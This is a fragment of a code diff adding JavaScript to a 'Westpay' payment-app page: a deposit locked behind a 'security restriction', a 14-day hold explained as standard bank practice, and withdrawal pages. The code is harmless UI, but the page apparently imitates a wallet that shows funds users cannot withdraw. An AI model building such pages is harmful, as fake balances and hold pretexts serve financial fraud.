+      showMessageBox('Request money feature would open here');
+    });
+
+    // Click on Michigan Mark transaction
+    michiganMark.addEventListener('click', () => {
+      securityRestriction.classList.remove('hidden');
+      securityRestriction.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      securityRestriction.style.transform = 'scale(1.02)';
+      setTimeout(() => {
+        securityRestriction.style.transform = 'scale(1)';
+      }, 200);
+    });
+
+    // Learn more click
+    learnMore.addEventListener('click', (e) => {
+      e.preventDefault();
+      showMessageBox('Westpay uses advanced security protocols to protect your funds. All recent deposits undergo a 14-day security processing period to prevent fraudulent activities and ensure the safety of your money. This is a standard security measure used by leading financial institutions worldwide.');
+    });
+
     // Initialize
-    window.onload = () => {
+    document.addEventListener('DOMContentLoaded', () => {
       createParticles();
       updateCurrentTime();
-    };
-    
-    // Update time every minute
-    setInterval(updateCurrentTime, 60000);
+      setInterval(updateCurrentTime, 60000);
+      
+      // Ensure login section is visible on load
+      loginSection.classList.remove('hidden');
+      dashboard.classList.add('hidden');
+      withdrawOptionsPage.classList.add('hidden');
+      mobileWithdrawPage.classList.add('hidden');
+      bankWithdrawPage.classList.add('hidden');
+      mobileProviderPage.classList.add('hidden');
+    });
   </script>
 </body>
 </html>
-
